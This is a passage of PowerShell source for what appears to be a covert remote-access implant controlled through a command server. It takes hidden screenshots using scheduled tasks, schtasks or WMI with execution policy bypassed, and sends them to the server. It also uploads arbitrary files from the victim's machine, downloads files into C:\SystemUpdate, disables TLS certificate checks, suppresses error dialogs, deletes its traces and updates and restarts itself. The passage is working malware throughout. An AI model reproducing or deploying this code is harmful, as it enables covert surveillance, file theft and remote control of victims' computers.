                                Get-ChildItem $env:TEMP -Filter 'cap_out_*.jpg' -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
                                Get-ChildItem $env:TEMP -Filter 'cap_err_*.txt' -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
                            } catch {}

                            $capTaskId  = "Capture_$(Get-Random)"
                            $capScript  = Join-Path $env:TEMP "cap_$capTaskId.ps1"
                            $capOut     = Join-Path $env:TEMP "cap_out_$capTaskId.jpg"
                            $capErr     = Join-Path $env:TEMP "cap_err_$capTaskId.txt"
                            $capCode = @"

# Suppress Windows error dialog popups (silent execution)
[System.Net.ServicePointManager]::DefaultConnectionLimit = 4
try { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls13 } catch { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 }
try {
    if (-not ([System.Management.Automation.PSTypeName]'TrustAllCerts2').Type) {
        Add-Type @'
using System.Net; using System.Security.Cryptography.X509Certificates;
public class TrustAllCerts2 : ICertificatePolicy { public bool CheckValidationResult(ServicePoint sp, X509Certificate cert, WebRequest req, int problem) { return true; } }
'@
    }
    [System.Net.ServicePointManager]::CertificatePolicy = [TrustAllCerts2]::new()
} catch { [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { `$true } }

# Suppress SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX
try {
    if (-not ([System.Management.Automation.PSTypeName]'NativeCapture').Type) {
        Add-Type @'
using System;
using System.Runtime.InteropServices;
public class NativeCapture {
    [DllImport("kernel32.dll")] public static extern uint SetErrorMode(uint mode);
    public static void SuppressErrorBoxes() { SetErrorMode(0x0001 | 0x0002 | 0x8000); }
}
'@
    }
    [NativeCapture]::SuppressErrorBoxes()
} catch {}

function Report([string]`$msg) {
    try { [System.IO.File]::WriteAllText('$capErr', `$msg) } catch {}
    try {
        `$wc = New-Object System.Net.WebClient
        `$wc.Headers.Add('User-Agent','Mozilla/5.0')
        `$wc.Headers.Add('X-Token','$cfToken')
        `$wc.UploadData('$cfHost/result?id=$clientId','POST',[System.Text.Encoding]::UTF8.GetBytes(`$msg)) | Out-Null
        `$wc.Dispose()
    } catch {}
}
function UploadFrame([byte[]]`$data) {
    `$r = [System.Net.HttpWebRequest]::Create('$cfHost/capture_frame?id=$clientId')
    `$r.Method='POST'; `$r.ContentType='image/jpeg'; `$r.ContentLength=`$data.Length
    `$r.Timeout=15000; `$r.ReadWriteTimeout=15000; `$r.UserAgent='Mozilla/5.0'
    `$r.Headers.Add('X-Token','$cfToken')
    `$s = `$r.GetRequestStream(); `$s.Write(`$data,0,`$data.Length); `$s.Close()
    `$r.GetResponse().Close()
}
try {
    # Load assemblies silently — no WinForms window is ever shown
    [void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')
    [void][System.Reflection.Assembly]::LoadWithPartialName('System.Drawing')
    `$scr   = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    `$bmp   = New-Object System.Drawing.Bitmap(`$scr.Width, `$scr.Height)
    `$g     = [System.Drawing.Graphics]::FromImage(`$bmp)
    `$g.CopyFromScreen(`$scr.Location, [System.Drawing.Point]::Empty, `$scr.Size)
    `$g.Dispose()
    `$ms    = New-Object System.IO.MemoryStream
    `$codec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { `$_.MimeType -eq 'image/jpeg' }
    `$ep    = New-Object System.Drawing.Imaging.EncoderParameters(1)
    `$ep.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, 85L)
    `$bmp.Save(`$ms, `$codec, `$ep)
    `$bmp.Dispose()
    `$bytes = `$ms.ToArray()
    [System.IO.File]::WriteAllBytes('$capOut', `$bytes)
    UploadFrame `$bytes
} catch {
    Report "[!] Capture failed: `$(`$_.Exception.Message)"
}
"@
                            [System.IO.File]::WriteAllText($capScript, $capCode, [System.Text.Encoding]::UTF8)

                            # Helper: poll for capOut/capErr up to $waitSec seconds
                            function Wait-CaptureOutput([int]$waitSec) {
                                $dl = (Get-Date).AddSeconds($waitSec)
                                while ((Get-Date) -lt $dl) {
                                    if (Test-Path $capOut) { return 'out' }
                                    if (Test-Path $capErr) { return 'err' }
                                    Start-Sleep -Milliseconds 400
                                }
                                return 'timeout'
                            }

                            $captureSucceeded = $false

                            # ── Method 1: PowerShell scheduled task API (Interactive logon) ──
                            try {
                                $capAction    = New-ScheduledTaskAction -Execute 'PowerShell.exe' `
                                                    -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -NoProfile -File `"$capScript`""
                                $capPrincipal = New-ScheduledTaskPrincipal -UserId $loggedOnUser -LogonType Interactive
                                # -Hidden suppresses task tray icon/notification; ExecutionTimeLimit 0 = no dialog on timeout
                                $capSettings  = New-ScheduledTaskSettingsSet `
                                                    -AllowStartIfOnBatteries `
                                                    -DontStopIfGoingOnBatteries `
                                                    -Hidden `
                                                    -ExecutionTimeLimit (New-TimeSpan -Minutes 2)
                                Register-ScheduledTask -TaskName $capTaskId -Action $capAction -Principal $capPrincipal -Settings $capSettings -Force | Out-Null
                                Start-ScheduledTask -TaskName $capTaskId
                                $script:captureTaskId = $capTaskId; $script:captureScriptPath = $capScript
                                $script:captureOutPath = $capOut; $script:captureErrPath = $capErr
                                Write-Log "Capture method1 (PS task) started: $capTaskId as $loggedOnUser" "INFO"
                                # Give task 2s to transition out of Ready state before polling
                                Start-Sleep -Seconds 2
                                $w1 = Wait-CaptureOutput 35
                                if ($w1 -ne 'timeout') { $captureSucceeded = $true }
                            } catch {
                                Write-Log "Capture method1 failed: $($_.Exception.Message)" "WARN"
                            }
                            try { Stop-ScheduledTask -TaskName $capTaskId -ErrorAction SilentlyContinue } catch {}
                            try { Unregister-ScheduledTask -TaskName $capTaskId -Confirm:$false -ErrorAction SilentlyContinue } catch {}
                            $script:captureTaskId = $null

                            # ── Method 2: schtasks.exe CLI (no /IT on /Run — avoids interactive sound) ──
                            if (-not $captureSucceeded -and -not (Test-Path $capOut) -and -not (Test-Path $capErr)) {
                                Write-Log "Capture trying method2 (schtasks CLI)" "INFO"
                                try {
                                    $psArg = "-ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -NoProfile -File `"$capScript`""
                                    # /IT on /Create binds to interactive token; omit /IT on /Run to avoid shell sounds
                                    $psi = New-Object System.Diagnostics.ProcessStartInfo 'schtasks.exe'
                                    $psi.Arguments = "/Create /F /TN `"$capTaskId`" /TR `"PowerShell.exe $psArg`" /SC ONCE /ST 00:00 /RU `"$loggedOnUser`" /IT"
                                    $psi.WindowStyle = 'Hidden'; $psi.CreateNoWindow = $true
                                    $psi.UseShellExecute = $false
                                    $psi.RedirectStandardOutput = $true; $psi.RedirectStandardError = $true
                                    $stProc = [System.Diagnostics.Process]::Start($psi)
                                    $stProc.WaitForExit(5000) | Out-Null
                                    if ($stProc.ExitCode -eq 0) {
                                        $psi2 = New-Object System.Diagnostics.ProcessStartInfo 'schtasks.exe'
                                        $psi2.Arguments = "/Run /TN `"$capTaskId`""
                                        $psi2.WindowStyle = 'Hidden'; $psi2.CreateNoWindow = $true
                                        $psi2.UseShellExecute = $false
                                        $psi2.RedirectStandardOutput = $true; $psi2.RedirectStandardError = $true
                                        $stRun = [System.Diagnostics.Process]::Start($psi2)
                                        $stRun.WaitForExit(5000) | Out-Null
                                        $script:captureTaskId = $capTaskId
                                        Write-Log "Capture method2 (schtasks CLI) started" "INFO"
                                        Start-Sleep -Seconds 2
                                        $w2 = Wait-CaptureOutput 35
                                        if ($w2 -ne 'timeout') { $captureSucceeded = $true }
                                    }
                                } catch {
                                    Write-Log "Capture method2 failed: $($_.Exception.Message)" "WARN"
                                }
                                # Delete task silently via ProcessStartInfo to avoid console flash
                                try {
                                    $psiDel = New-Object System.Diagnostics.ProcessStartInfo 'schtasks.exe'
                                    $psiDel.Arguments = "/Delete /TN `"$capTaskId`" /F"
                                    $psiDel.WindowStyle = 'Hidden'; $psiDel.CreateNoWindow = $true
                                    $psiDel.UseShellExecute = $false
                                    $psiDel.RedirectStandardOutput = $true; $psiDel.RedirectStandardError = $true
                                    [System.Diagnostics.Process]::Start($psiDel).WaitForExit(3000) | Out-Null
                                } catch {}
                                $script:captureTaskId = $null
                            }

                            # ── Method 3: WMI Win32_Process.Create ───────────────────────────
                            if (-not $captureSucceeded -and -not (Test-Path $capOut) -and -not (Test-Path $capErr)) {
                                Write-Log "Capture trying method3 (WMI Win32_Process)" "INFO"
                                try {
                                    $wmiCmd = "PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -NoProfile -File `"$capScript`""
                                    $wmiRes = ([wmiclass]"\\\\`.\root\cimv2:Win32_Process").Create($wmiCmd)
                                    if ($wmiRes.ReturnValue -eq 0) {
                                        Write-Log "Capture method3 (WMI) PID=$($wmiRes.ProcessId)" "INFO"
                                        $w3 = Wait-CaptureOutput 35
                                        if ($w3 -ne 'timeout') { $captureSucceeded = $true }
                                    } else {
                                        Write-Log "Capture method3 WMI ReturnValue=$($wmiRes.ReturnValue)" "WARN"
                                    }
                                } catch {
                                    Write-Log "Capture method3 failed: $($_.Exception.Message)" "WARN"
                                }
                            }

                            # ── Cleanup and final report ─────────────────────────────────────
                            try { Remove-Item $capScript -Force -ErrorAction SilentlyContinue } catch {}
                            $script:captureScriptPath = $null; $script:captureOutPath = $null; $script:captureErrPath = $null

                            if (Test-Path $capErr) {
                                $errTxt = [System.IO.File]::ReadAllText($capErr).Trim()
                                try { Remove-Item $capErr -Force -ErrorAction SilentlyContinue } catch {}
                                throw $errTxt
                            }
                            if (Test-Path $capOut) {
                                try { Remove-Item $capOut -Force -ErrorAction SilentlyContinue } catch {}
                                Send-Result-To-Server -Body "[+] Screenshot captured. View at: $cfHost/capture_view?id=$clientId`n"
                                Start-Sleep -Milliseconds $activeDelay
                                continue
                            }
                            # All 3 methods exhausted
                            throw "Screenshot task did not run after 3 methods (PS task, schtasks /IT, WMI). Is an interactive session active for $loggedOnUser?"
                        } else {
                            # --- Non-SYSTEM path: capture directly (no window ever shown) ---
                            [void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')
                            [void][System.Reflection.Assembly]::LoadWithPartialName('System.Drawing')
                            $s   = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                            $bmp = New-Object System.Drawing.Bitmap($s.Width, $s.Height)
                            $g   = [System.Drawing.Graphics]::FromImage($bmp)
                            $g.CopyFromScreen($s.Location, [System.Drawing.Point]::Empty, $s.Size)
                            $g.Dispose()
                            $ms  = New-Object System.IO.MemoryStream
                            $codec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' }
                            $ep = New-Object System.Drawing.Imaging.EncoderParameters(1)
                            $ep.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, 85L)
                            $bmp.Save($ms, $codec, $ep)
                            $bmp.Dispose()
                            $jpegBytes = $ms.ToArray()
                            $ms.Dispose()
                        }

                        $captureUrl = "$cfHost/capture_frame?id=$clientId"
                        $req = [System.Net.HttpWebRequest]::Create($captureUrl)
                        $req.Method           = 'POST'
                        $req.ContentType      = 'image/jpeg'
                        $req.ContentLength    = $jpegBytes.Length
                        $req.Timeout          = 15000
                        $req.ReadWriteTimeout = 15000
                        $req.UserAgent        = 'Mozilla/5.0'
                        $req.Headers.Add('X-Token', $cfToken)
                        $rs2 = $req.GetRequestStream()
                        $rs2.Write($jpegBytes, 0, $jpegBytes.Length)
                        $rs2.Close()
                        $req.GetResponse().Close()
                        Send-Result-To-Server -Body "[+] Screenshot captured. View at: $cfHost/capture_view?id=$clientId`n"
                    } catch {
                        Send-Result-To-Server -Body "[!] Capture failed: $($_.Exception.Message)`n"
                    }
                    Start-Sleep -Milliseconds $activeDelay
                    continue
                }

                # Shortcut commands → auto-route to gui:
                $guiShortcuts = @{
                    "camera"     = "cmd /c start microsoft.windows.camera:"
                    "recorder"   = "cmd /c start microsoft.windows.soundrecorder:"
                    "settings"   = "cmd /c start ms-settings:"
                    "calc"       = "calc.exe"
                }
                if ($guiShortcuts.ContainsKey($command.ToLower())) {
                    $command = "gui:" + $guiShortcuts[$command.ToLower()]
                }

                # File transfer: get:<filepath> → resolve relative paths, upload to server
                if ($command -match '^get:(.+)$') {
                    $filePath = $Matches[1].Trim()
                    # Resolve relative path against the persistent runspace's current directory
                    if (-not [System.IO.Path]::IsPathRooted($filePath)) {
                        try {
                            $cwdPs = [powershell]::Create()
                            $cwdPs.Runspace = (Get-PersistentRunspace)
                            $cwdResult = $cwdPs.AddScript('(Get-Location).Path').Invoke() | ForEach-Object { $_.ToString() }
                            $cwdPs.Dispose()
                            $cwd = if ($cwdResult) { @($cwdResult)[0] } else { (Get-Location).Path }
                        } catch { $cwd = (Get-Location).Path }
                        $filePath = [System.IO.Path]::Combine($cwd, $filePath)
                    }
                    if (-not (Test-Path -LiteralPath $filePath -PathType Leaf)) {
                        Send-Result-To-Server -Body "[!] File not found: $filePath`n"
                        Start-Sleep -Milliseconds $activeDelay
                        continue
                    }
                    try {
                        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
                        $fileName = [System.IO.Path]::GetFileName($filePath)
                        $uploadUrl = "$cfHost/upload?id=$clientId&filename=$([Uri]::EscapeDataString($fileName))"
                        $wc = New-Object System.Net.WebClient
                        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
                        $wc.Headers.Add("X-Token", $cfToken)
                        $wc.UploadData($uploadUrl, "POST", $fileBytes) | Out-Null
                        Send-Result-To-Server -Body "[+] Sent '$filePath' ($($fileBytes.Length) bytes)`n"
                    } catch {
                        Send-Result-To-Server -Body "[!] Upload failed: $($_.Exception.Message)`n"
                    }
                    Start-Sleep -Milliseconds $activeDelay
                    continue
                }

                # File transfer: put:<filename> → fetch bytes from server, save to C:\SystemUpdate\
                if ($command -match '^put:(.+)$') {
                    $fileName = $Matches[1].Trim()
                    $destDir  = 'C:\SystemUpdate'
                    $destPath = Join-Path $destDir $fileName
                    try {
                        if (-not (Test-Path $destDir)) {
                            New-Item -ItemType Directory -Path $destDir -Force | Out-Null
                        }
                        $wc = New-Object System.Net.WebClient
                        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
                        $wc.Headers.Add("X-Token", $cfToken)
                        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
                        $fileBytes = $wc.DownloadData("$cfHost/fetch?id=$clientId")
                        $wc.Dispose()
                        if ($fileBytes -and $fileBytes.Length -gt 0) {
                            [System.IO.File]::WriteAllBytes($destPath, $fileBytes)
                            Send-Result-To-Server -Body "[+] Saved '$fileName' to '$destPath' ($($fileBytes.Length) bytes)`n"
                        } else {
                            Send-Result-To-Server -Body "[!] No file data received from server`n"
                        }
                    } catch {
                        Send-Result-To-Server -Body "[!] Put failed: $($_.Exception.Message)`n"
                    }
                    Start-Sleep -Milliseconds $activeDelay
                    continue
                }

                Invoke-CommandStreaming -Command $command

                Start-Sleep -Milliseconds $activeDelay
            }
            else {
                $consecutiveIdle++
                # No sleep needed — /cmd long-polls on the server for 30s.
                # The server only returns when a command is ready or the hold expires.

                # --- AUTO-UPDATE CHECK (removable) ---
                $minsSinceCheck = ((Get-Date) - $script:lastUpdateCheck).TotalMinutes
                if ($minsSinceCheck -ge $updateCheckMins) {
                    if (Update-Self) { exit }
                }
                # --- end auto-update check ---
            }
        }
        catch {
            $retryCount++
            Write-Log "Connection error #$retryCount : $($_.Exception.Message)" "ERROR"

            # Track how long we've been failing continuously
            if ($null -eq $failingSince) { $failingSince = Get-Date }

            $backoff = [Math]::Min(60, [Math]::Pow(2, $retryCount))
            Start-Sleep -Seconds $backoff

            if ($retryCount -ge $maxRetries) {
                Write-Log "Max retries ($maxRetries) hit. Flushing connections." "WARN"
                $retryCount = 0

                # --- CONNECTION RECOVERY (fixes stale pool after sleep/wake) ---
                try { [System.Net.ServicePointManager]::FindServicePoint([Uri]$cfHost).CloseConnectionGroup("") } catch {}
                try { ipconfig /flushdns 2>$null | Out-Null } catch {}
                # --- end connection recovery ---
            }

            # --- SELF-KILL after continuous failure (watchdog restarts fresh) ---
            if ($null -ne $failingSince) {
                $failMinutes = ((Get-Date) - $failingSince).TotalMinutes
                if ($failMinutes -ge $selfKillMins) {
                    Write-Log "Failing for ${failMinutes}m. Self-killing for watchdog restart." "WARN"
                    try { $script:singleInstanceMutex.ReleaseMutex() } catch {}
                    try { $script:singleInstanceMutex.Dispose() } catch {}
                    exit
                }
            }
            # --- end self-kill ---
        }
    }
}

Connect-Cloudflare
